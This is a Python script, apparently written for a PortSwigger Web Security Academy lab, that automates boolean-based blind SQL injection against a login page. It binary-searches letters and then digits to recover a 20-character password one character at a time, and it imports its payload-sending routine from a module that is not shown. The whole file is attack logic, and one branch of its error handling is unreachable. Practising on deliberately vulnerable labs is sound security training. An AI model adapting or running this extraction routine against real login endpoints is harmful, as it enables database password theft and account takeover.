from src.payload_and_stuff import sending_payload_for_boolean_based_SQLi
import sys
from colorama import Fore, Style
from src.info_message import output_message, warning_message, successful_message
from src.binary_search import  binary_search_for_boolean_sqli
from src.info_message import welcome_message



def get_password_with_boolean_based_SQLi():

    welcome_message()
        
    #Initialisation of variable
    indice = 1 #use to change the indice of the password 
    liste = [] #list all the found character 
    success = True 
    while indice <= 20: #we assume that the password have 20 character
        if success: #initialisation of all variable used during the process
            letter = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']    
            low_bound = 0
            high_bound = 25
            mid_point = 13
            marquage = 'lettre'
            operator1 = '>'
            operator2 = '='
            payload_parameter1 = f"{operator1}'{letter[mid_point]}'"
            payload_parameter2 = f"{operator2}'{letter[mid_point]}'"
            success = False
                    
        url = 'https://0a0800dc04395ece80fe3f9d009700b9.web-security-academy.net/login'
        output_message(f"[++] Tested payload : {payload_parameter1}, {payload_parameter2}")
        output_message(f"[++] Current terminal : low = {low_bound}, higt = {high_bound}, binary_average = {mid_point}")
        output_message(f"[++] Index number : {indice}")
        status_code, status_code2= sending_payload_for_boolean_based_SQLi(payload_parameter1, payload_parameter2, url, indice)
       
        print(f"Status_code: {status_code}, Status_code2: {status_code2}\n")

        
        """We will make a binary search craft specialy for this kind of attack"""
        
        while low_bound <= high_bound:
            try:
                high_bound,low_bound,mid_point = binary_search_for_boolean_sqli(status_code, operator1, high_bound, low_bound, mid_point)
                
                """The result_control will say if the payload parameter is correct, if it's the case, we change the index"""
                
                if status_code2 != 200:
                    success = True
                    successful_message(f"Succesfull payload with {payload_parameter2} parameter !!! ")
                    indice +=1
                    match marquage:#the purpose here is to print correctly the working 
                        case "chiffre":
                            liste.append(str(mid_point))
                        case "lettre":
                            liste.append(str(letter[mid_point]))
                    break
            except Exception as e:
                print(f"error during binary search {e}")
             
            """We change the binary_average in order to search the best parameter"""
                    
            mid_point = (low_bound+high_bound)//2
            match marquage:
                case 'chiffre':
                    payload_parameter1 = f"{operator1}'{mid_point}'"
                    payload_parameter2 = f"{operator2}'{mid_point}'"
                case 'lettre':
                    payload_parameter1 = f"{operator1}'{letter[mid_point]}'"
                    payload_parameter2 = f"{operator2}'{letter[mid_point]}'"
                    
            """We send a packet with the new craft payload and see if it work"""
                    
            output_message(f"[++] Tested payload : {payload_parameter1}, {payload_parameter2}")
            output_message(f"[++] Current terminal : low = {low_bound}, higt = {high_bound}, binary_average = {mid_point}")
            output_message(f"[++] Index number : {indice}")
            status_code, status_code2 = sending_payload_for_boolean_based_SQLi(payload_parameter1, payload_parameter2, url, indice)
            print(f"Status_code: {status_code}, Status_code2: {status_code2}\n")

            
            if status_code2 != 200:
                success = True
                successful_message(f"Succesfull payload with {payload_parameter2} parameter !!! ")
                indice +=1
                
                """Here we match the marquage to the good term in order to print the correct parameter to the user"""
                
                match marquage:
                    case "chiffre":
                        liste.append(str(mid_point))
                    case "lettre":
                        liste.append(str(letter[mid_point]))
                break
            
        """Here the part where we change letters to numbers"""
           
        if low_bound > high_bound:  
            low_bound, high_bound = 0, 10 
            mid_point = (low_bound+high_bound)//2
            marquage = 'chiffre'
            print(Fore.MAGENTA + "Move on to the numbers test.\n" + Style.RESET_ALL)
            success = False
            payload_parameter1 = f"{operator1}'{mid_point}'"
            payload_parameter2 = f"{operator2}'{mid_point}'"
        
        #in case if the letters and the numbers don't work, we stop the programm. 
                        
        elif low_bound > high_bound and marquage == 'chiffre':
            warning_message("All tests failed :( ")
            break
            
        print(Fore.YELLOW + f"Payload result... {''.join(liste)}\n\n" + Style.RESET_ALL)
        
        
if __name__=='__main__':
    get_password_with_boolean_based_SQLi()
